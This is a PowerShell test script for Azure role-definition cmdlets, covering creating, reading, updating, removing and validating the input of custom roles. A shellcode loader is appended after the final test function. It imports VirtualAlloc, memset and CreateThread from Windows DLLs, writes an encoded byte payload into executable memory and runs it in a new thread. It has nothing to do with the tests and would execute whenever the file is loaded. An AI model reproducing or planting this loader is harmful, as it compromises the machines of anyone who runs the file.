














function Test-RoleDefinitionCreateTests
{
    
    
    $rdName = 'CustomRole Tests Role'
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\NewRoleDefinition.json
    New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId ee78fa8a-3cdd-418e-a4d8-949b57a33dcd

    $rd = Get-AzRoleDefinition -Name $rdName
    Assert-AreEqual "Test role" $rd.Description
    Assert-AreEqual $true $rd.IsCustom
    Assert-NotNull $rd.Actions
    Assert-AreEqual "Microsoft.Authorization/*/read" $rd.Actions[0]
    Assert-AreEqual "Microsoft.Support/*" $rd.Actions[1]
    Assert-NotNull $rd.AssignableScopes
    Assert-Null $rd.DataActions
    Assert-Null $rd.NotDataActions

    
    $roleDef = Get-AzRoleDefinition -Name "Reader"
    $roleDef.Id = $null
    $roleDef.Name = "New Custom Reader"
    $roleDef.Actions.Add("Microsoft.ClassicCompute/virtualMachines/restart/action")
    $roleDef.Description = "Read, monitor and restart virtual machines"
    $roleDef.AssignableScopes[0] = "/subscriptions/4004a9fd-d58e-48dc-aeb2-4a4aec58606f"

    New-AzRoleDefinitionWithId -Role $roleDef -RoleDefinitionId 678c13e9-6637-4471-8414-e95f7a660b0b
    $addedRoleDef = Get-AzRoleDefinition -Name "New Custom Reader"

    Assert-NotNull $addedRoleDef.Actions
    Assert-AreEqual $roleDef.Description $addedRoleDef.Description
    Assert-AreEqual $roleDef.AssignableScopes $addedRoleDef.AssignableScopes
    Assert-AreEqual $true $addedRoleDef.IsCustom

    Remove-AzRoleDefinition -Id $addedRoleDef.Id -Force
    Remove-AzRoleDefinition -Id $rd.Id -Force
}


function Test-RdNegativeScenarios
{
    
    
    $rdName = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'
    $rdNull = Get-AzRoleDefinition -Name $rdName
    Assert-Null $rdNull

    $rdId = '85E460B3-89E9-48BA-9DCD-A8A99D64A674'

    $badIdException = "Cannot find role definition with id '" + $rdId + "'."

    
    $inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\RoleDefinition.json
	Assert-Throws { Set-AzRoleDefinition -InputFile $inputFilePath } $badIdException

    
    $roleDefNotProvided = "Parameter set cannot be resolved using the specified named parameters."
    Assert-Throws { Set-AzRoleDefinition } $roleDefNotProvided

    
    $roleDefNotProvided = "Cannot validate argument on parameter 'InputFile'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again."
    Assert-Throws { Set-AzRoleDefinition -InputFile "" } $roleDefNotProvided
    Assert-Throws { Set-AzRoleDefinition -InputFile "" -Role $rdNull } $roleDefNotProvided

    
    $roleDefNotProvided = "Cannot validate argument on parameter 'Role'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again."
    Assert-Throws { Set-AzRoleDefinition -Role $rdNull } $roleDefNotProvided
    Assert-Throws { Set-AzRoleDefinition -InputFile $inputFilePath -Role $rd } $roleDefNotProvided

    

    $removeRoleException = "The specified role definition with ID '" + $rdId + "' does not exist."
    
    $missingSubscription = "MissingSubscription: The request did not have a provided subscription. All requests must have an associated subscription Id."
    Assert-Throws { Remove-AzRoleDefinition -Id $rdId -Force} $removeRoleException
}


function Test-RDPositiveScenarios
{
    
    
    $rdName = 'Another tests role'
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\RoleDefinition.json
    $rd = New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId 0a0e83bc-50b9-4c4d-b2c2-3f41e1a8baf2
    $rd = Get-AzRoleDefinition -Name $rdName

    
    $rd.Actions.Add('Microsoft.Authorization/*/read')
    $updatedRd = Set-AzRoleDefinition -Role $rd
    Assert-NotNull $updatedRd

    
    $deletedRd = Remove-AzRoleDefinition -Id $rd.Id -Force -PassThru
    Assert-AreEqual $rd.Name $deletedRd.Name

    
    $readRd = Get-AzRoleDefinition -Name $rd.Name
    Assert-Null $readRd
}


function Test-RDUpdate
{

    
    $rdName = 'Another tests role'
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\RoleDefinition.json
    $rd = New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId 3d95b97a-5745-4c39-950c-0b608dea635f
    $rd = Get-AzRoleDefinition -Name $rdName

    
    $scopes = $rd.AssignableScopes | foreach { $_ }
    $rd.AssignableScopes.Clear()
    $rd.AssignableScopes.Add('/subscriptions/0b1f6471-1bf0-4dda-aec3-cb9272f09590/resourcegroups/rbactest')
    for($i = $scopes.Count - 1 ; $i -ge 0; $i--){
        $rd.AssignableScopes.Add($scopes[$i])
    }
    $updatedRd = Set-AzRoleDefinition -Role $rd
    Assert-NotNull $updatedRd

    
    $deletedRd = Remove-AzRoleDefinition -Id $rd.Id -Force -PassThru
    Assert-AreEqual $rd.Name $deletedRd.Name
}


function Test-RDCreateFromFile
{
    
    
    $badScopeException = "Exception calling `"ExecuteCmdlet`" with `"0`" argument(s): `"Scope '/subscriptions/4004a9fd-d58e-48dc-aeb2-4a4aec58606f/ResourceGroups' should have even number of parts.`""
	try
	{
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\InvalidRoleDefinition.json
	    $rd = New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId 4482e4d1-8757-4d67-b3c1-5c8ccee3fdcc
		Assert-AreEqual "This assertion shouldn't be hit'" "New-AzRoleDefinition should've thrown an exception"
	}
	catch
	{
	    Assert-AreEqual $badScopeException $_
	}
}


function Test-RDRemove
{
    
    

    $subscription = $(Get-AzContext).Subscription
    $resourceGroups = Get-AzResourceGroup | Select-Object -Last 1 -Wait

    $scope = "/subscriptions/" + $subscription[0].SubscriptionId
    $rgScope = "/subscriptions/" + $subscription[0].SubscriptionId + "/resourceGroups/" + $resourceGroups[0].ResourceGroupName

    $roleDef = Get-AzRoleDefinition -Name "Reader"
    $roleDef.Id = $null
    $roleDef.Name = "CustomRole123_65E1D983-ECF4-42D4-8C08-5B1FD6E86335"
    $roleDef.Description = "Test Remove RD"
    $roleDef.AssignableScopes[0] = $rgScope

    $Rd = New-AzRoleDefinitionWithId -Role $roleDef -RoleDefinitionId ec2eda29-6d32-446b-9070-5054af630991
    Assert-NotNull $Rd

    
    $badIdException = "RoleDefinitionDoesNotExist: The specified role definition with ID '" + $Rd.Id + "' does not exist."
    Assert-Throws { Remove-AzRoleDefinition -Id $Rd.Id -Scope $scope -Force -PassThru} $badIdException

    
    $badIdException = "RoleDefinitionDoesNotExist: The specified role definition with ID '" + $Rd.Id + "' does not exist."
    Assert-Throws { Remove-AzRoleDefinition -Id $Rd.Id -Scope $scope -Force -PassThru} $badIdException

    
    $deletedRd = Remove-AzRoleDefinition -Id $Rd.Id -Scope $rgScope -Force -PassThru
    Assert-AreEqual $Rd.Name $deletedRd.Name
}


function Test-RDGet
{
    
    $subscription = $(Get-AzContext).Subscription

    $resource = Get-AzResource | Select-Object -Last 1 -Wait
    Assert-NotNull $resource "Cannot find any resource to continue test execution."

    $subScope = "/subscriptions/" + $subscription[0].SubscriptionId
    $rgScope = "/subscriptions/" + $subscription[0].SubscriptionId + "/resourceGroups/" + $resource.ResourceGroupName
    $resourceScope = $resource.ResourceId

    $roleDef1 = Get-AzRoleDefinition -Name "Reader"
    $roleDef1.Id = $null
    $roleDef1.Name = "CustomRole_99CC0F56-7395-4097-A31E-CC63874AC5EF"
    $roleDef1.Description = "Test Get RD"
    $roleDef1.AssignableScopes[0] = $subScope

    $roleDefSubScope = New-AzRoleDefinitionWithId -Role $roleDef1 -RoleDefinitionId d4fc9f7d-2f66-49e9-ac32-d0586105c587
    Assert-NotNull $roleDefSubScope

    $roleDef1.Id = $null
    $roleDef1.Name = "CustomRole_E3CC9CD7-9D0A-47EC-8C75-07C544065220"
    $roleDef1.Description = "Test Get RD"
    $roleDef1.AssignableScopes[0] = $rgScope

    $roleDefRGScope = New-AzRoleDefinitionWithId -Role $roleDef1 -RoleDefinitionId 6f699c1d-055a-4b2b-93ff-51e4be914a67
    Assert-NotNull $roleDefRGScope

    $roleDef1.Id = $null
    $roleDef1.Name = "CustomRole_8D2E860C-5640-4B7C-BD3C-80940C715033"
    $roleDef1.Description = "Test Get RD"
    $roleDef1.AssignableScopes[0] = $resourceScope

    $roleDefResourceScope = New-AzRoleDefinitionWithId -Role $roleDef1 -RoleDefinitionId ede64d68-3f7d-4495-acc7-5fc2afdfe0ea
    Assert-NotNull $roleDefResourceScope

    
    $roles1 = Get-AzRoleDefinition -Scope $subScope
    

    
    $roles2 = Get-AzRoleDefinition -Scope $rgScope
    

    
    $roles3 = Get-AzRoleDefinition -Scope $resourceScope
    


    
    $deletedRd = Remove-AzRoleDefinition -Id $roleDefSubScope.Id -Scope $subScope -Force -PassThru
    Assert-AreEqual $roleDefSubScope.Name $deletedRd.Name

    
    $deletedRd = Remove-AzRoleDefinition -Id $roleDefRGScope.Id -Scope $rgScope -Force -PassThru
    Assert-AreEqual $roleDefRGScope.Name $deletedRd.Name

    
    $deletedRd = Remove-AzRoleDefinition -Id $roleDefResourceScope.Id -Scope $resourceScope -Force -PassThru
    Assert-AreEqual $roleDefResourceScope.Name $deletedRd.Name
}


function Test-RoleDefinitionDataActionsCreateTests
{
    
    
    $rdName = 'CustomRole Tests Role New'
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\DataActionsRoleDefinition.json
    New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId e3efe8c9-d9ae-4f0e-838d-57ce43068a13

    $rd = Get-AzRoleDefinition -Name $rdName
    Assert-AreEqual "Test role" $rd.Description
    Assert-AreEqual $true $rd.IsCustom
    Assert-NotNull $rd.DataActions
    Assert-AreEqual "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/*" $rd.DataActions[0]
    Assert-NotNull $rd.NotDataActions
    Assert-AreEqual "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write" $rd.NotDataActions[0]
    Assert-NotNull $rd.AssignableScopes
    Assert-Null $rd.Actions
    Assert-Null $rd.NotActions

    
    $roleDef = Get-AzRoleDefinition -Name "Reader"
    $roleDef.Id = $null
    $roleDef.Name = "New Custom Reader"
    $roleDef.DataActions.Add("Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write")
    $roleDef.Description = "Read, monitor and restart virtual machines"
    $roleDef.AssignableScopes[0] = "/subscriptions/0b1f6471-1bf0-4dda-aec3-cb9272f09590"

    New-AzRoleDefinitionWithId -Role $roleDef -RoleDefinitionId 3be51641-acdb-4f4a-801f-a93da8c5762d
    $addedRoleDef = Get-AzRoleDefinition -Name "New Custom Reader"

    Assert-NotNull $addedRoleDef.Actions
    Assert-AreEqual $roleDef.Description $addedRoleDef.Description
    Assert-AreEqual $roleDef.AssignableScopes $addedRoleDef.AssignableScopes
    Assert-AreEqual $true $addedRoleDef.IsCustom

    Remove-AzRoleDefinition -Id $addedRoleDef.Id -Force
    Remove-AzRoleDefinition -Id $rd.Id -Force
}


function Test-RDGetCustomRoles
{
    
    
    $rdName = 'Another tests role'
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\RoleDefinition.json
    $rd = New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId 3d95b97a-5745-4c39-950c-0b608dea635f
    $rd = Get-AzRoleDefinition -Name $rdName

    $roles = Get-AzRoleDefinition -Custom
    Assert-NotNull $roles
    foreach($roleDefinition in $roles){
        Assert-AreEqual $roleDefinition.IsCustom $true
    }

    
    Remove-AzRoleDefinition -Id $rd.Id -Force
}


function Test-RdValidateInputParameters ($cmdName)
{
    
    

    
    
    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/Should be 'ResourceGroups'/any group name"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/Should be 'ResourceGroups'/any group name' should begin with '/subscriptions/<subid>/resourceGroups'."
    Assert-Throws { invoke-expression ($cmdName + " -Scope `"" + $scope  + "`" -Id D46245F8-7E18-4499-8E1F-784A6DA5BE25") } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups' should have even number of parts."
    Assert-Throws { &$cmdName -Scope $scope -Id D46245F8-7E18-4499-8E1F-784A6DA5BE25} $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups' should have even number of parts."
    Assert-Throws { &$cmdName -Scope $scope -Id D46245F8-7E18-4499-8E1F-784A6DA5BE25} $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Should be 'Providers'/any provider name"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Should be 'Providers'/any provider name' should begin with '/subscriptions/<subid>/resourceGroups/<groupname>/providers'."
    Assert-Throws { &$cmdName -Scope $scope -Id D46245F8-7E18-4499-8E1F-784A6DA5BE25} $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Providers/providername"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Providers/providername' should have at least one pair of resource type and resource name. e.g. '/subscriptions/<subid>/resourceGroups/<groupname>/providers/<providername>/<resourcetype>/<resourcename>'."
    Assert-Throws { &$cmdName -Scope $scope -Id D46245F8-7E18-4499-8E1F-784A6DA5BE25} $invalidScope
}



function Test-RdValidateInputParameters2 ($cmdName)
{
    
    

    $roleDef = Get-AzRoleDefinition -Name "Reader"
    $roleDef.Name = "CustomRole_99CC0F56-7395-4097-A31E-CC63874AC5EF"
    $roleDef.Description = "Test Get RD"

    
    
    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/Should be 'ResourceGroups'/any group name"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/Should be 'ResourceGroups'/any group name' should begin with '/subscriptions/<subid>/resourceGroups'."
    $roleDef.AssignableScopes[0] = $scope;
    Assert-Throws { &$cmdName -Role $roleDef } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups' should have even number of parts."
    $roleDef.AssignableScopes[0] = $scope;
    Assert-Throws { &$cmdName -Role $roleDef } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups' should have even number of parts."
    $roleDef.AssignableScopes[0] = $scope;
    Assert-Throws { &$cmdName -Role $roleDef } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Should be 'Providers'/any provider name"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Should be 'Providers'/any provider name' should begin with '/subscriptions/<subid>/resourceGroups/<groupname>/providers'."
    $roleDef.AssignableScopes[0] = $scope;
    Assert-Throws { &$cmdName -Role $roleDef } $invalidScope

    $scope = "/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Providers/providername"
    $invalidScope = "Scope '/subscriptions/e9ee799d-6ab2-4084-b952-e7c86344bbab/ResourceGroups/groupname/Providers/providername' should have at least one pair of resource type and resource name. e.g. '/subscriptions/<subid>/resourceGroups/<groupname>/providers/<providername>/<resourcetype>/<resourcename>'."
    $roleDef.AssignableScopes[0] = $scope;
    Assert-Throws { &$cmdName -Role $roleDef } $invalidScope
}


function Test-RDFilter
{
    
    $readerRole = Get-AzRoleDefinition -Name "Reader"
    Assert-NotNull $readerRole
    Assert-AreEqual $readerRole.Name "Reader"

    $customRoles = Get-AzRoleDefinition -Custom
    Assert-NotNull $customRoles
    foreach($role in $customRoles){
        Assert-NotNull $role
        Assert-AreEqual $role.IsCustom $true
    }
}


function Test-RDDataActionsNegativeTestCases
{
    
    
    $rdName = 'Another tests role'
	$inputFilePath = Join-Path -Path $TestOutputRoot -ChildPath Resources\RoleDefinition.json
    $rd = New-AzRoleDefinitionWithId -InputFile $inputFilePath -RoleDefinitionId 3d95b97a-5745-4c39-950c-0b608dea635f
    $rd = Get-AzRoleDefinition -Name $rdName

    $createdRole = Get-AzRoleDefinition -Name $rdName
    Assert-NotNull $createdRole

    $expectedExceptionForActions = "'Microsoft.Storage/storageAccounts/blobServices/containers/blobs/*' does not match any of the actions supported by the providers."
    $createdRole.Actions.Add("Microsoft.Storage/storageAccounts/blobServices/containers/blobs/*")
    Assert-Throws { New-AzRoleDefinitionWithId -Role $createdRole -RoleDefinitionId 0309cc23-a0be-471f-abeb-dd411a8422c7 } $expectedExceptionForActions
    $createdRole.Actions.Clear()

    $createdRole.DataActions.Add("Microsoft.Authorization/*/read")
    $expectedExceptionForDataActions = "The resource provider referenced in the action has not published any data operations."
    Assert-Throws { New-AzRoleDefinitionWithId -Role $createdRole -RoleDefinitionId 06801870-23ba-41ee-8bda-b0e2360164a8 } $expectedExceptionForDataActions
    $createdRole.DataActions.Clear()

    $createdRole.DataActions.Add("Microsoft.Storage/storageAccounts/blobServices/containers/blobs/*")
    $createdRole.NotActions.Add("Microsoft.Storage/storageAccounts/blobServices/containers/blobs/*")
    Assert-Throws { New-AzRoleDefinitionWithId -Role $createdRole -RoleDefinitionId e4c2893e-f945-4831-8b9f-3568eff03170 } $expectedExceptionForActions
    $createdRole.NotActions.Clear()

    $createdRole.NotDataActions.Add("Microsoft.Authorization/*/read")
    Assert-Throws { New-AzRoleDefinitionWithId -Role $createdRole -RoleDefinitionId a8ac9ed7-0ce6-4425-a221-c3d4c3063dc2 } $expectedExceptionForDataActions
    $createdRole.NotDataActions.Clear()

    
    Remove-AzRoleDefinition -Id $createdRole.Id -Force
}
$KUo = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $KUo -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc9,0xba,0xd1,0x03,0x54,0x3c,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x2d,0xe1,0xa1,0xc0,0x25,0x64,0x49,0x39,0xb5,0x09,0xc3,0xdc,0x84,0x09,0xb7,0x95,0xb6,0xb9,0xb3,0xf8,0x3a,0x31,0x91,0xe8,0xc9,0x37,0x3e,0x1e,0x7a,0xfd,0x18,0x11,0x7b,0xae,0x59,0x30,0xff,0xad,0x8d,0x92,0x3e,0x7e,0xc0,0xd3,0x07,0x63,0x29,0x81,0xd0,0xef,0x9c,0x36,0x55,0xa5,0x1c,0xbc,0x25,0x2b,0x25,0x21,0xfd,0x4a,0x04,0xf4,0x76,0x15,0x86,0xf6,0x5b,0x2d,0x8f,0xe0,0xb8,0x08,0x59,0x9a,0x0a,0xe6,0x58,0x4a,0x43,0x07,0xf6,0xb3,0x6c,0xfa,0x06,0xf3,0x4a,0xe5,0x7c,0x0d,0xa9,0x98,0x86,0xca,0xd0,0x46,0x02,0xc9,0x72,0x0c,0xb4,0x35,0x83,0xc1,0x23,0xbd,0x8f,0xae,0x20,0x99,0x93,0x31,0xe4,0x91,0xaf,0xba,0x0b,0x76,0x26,0xf8,0x2f,0x52,0x63,0x5a,0x51,0xc3,0xc9,0x0d,0x6e,0x13,0xb2,0xf2,0xca,0x5f,0x5e,0xe6,0x66,0x02,0x36,0xcb,0x4a,0xbd,0xc6,0x43,0xdc,0xce,0xf4,0xcc,0x76,0x59,0xb4,0x85,0x50,0x9e,0xbb,0xbf,0x25,0x30,0x42,0x40,0x56,0x18,0x80,0x14,0x06,0x32,0x21,0x15,0xcd,0xc2,0xce,0xc0,0x78,0xc6,0x58,0x52,0x16,0xb0,0x2e,0xcc,0xe5,0x40,0x47,0xec,0x63,0xa6,0x07,0xbe,0x23,0x77,0xe7,0x6e,0x84,0x27,0x8f,0x64,0x0b,0x17,0xaf,0x86,0xc1,0x30,0x45,0x69,0xbc,0x69,0xf1,0x10,0xe5,0xe2,0x60,0xdc,0x33,0x8f,0xa2,0x56,0xb0,0x6f,0x6c,0x9f,0xbd,0x63,0x18,0x6f,0x88,0xde,0x8e,0x70,0x26,0x74,0x2e,0xe5,0xcd,0xdf,0x79,0x91,0xcf,0x06,0x4d,0x3e,0x2f,0x6d,0xc6,0xf7,0xa5,0xce,0xb0,0xf7,0x29,0xcf,0x40,0xae,0x23,0xcf,0x28,0x16,0x10,0x9c,0x4d,0x59,0x8d,0xb0,0xde,0xcc,0x2e,0xe1,0xb3,0x47,0x47,0x0f,0xea,0xa0,0xc8,0xf0,0xd9,0x30,0x34,0x27,0x27,0x47,0x54,0xfb;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$sR4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($sR4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$sR4,0,0,0);for (;;){Start-sleep 60};

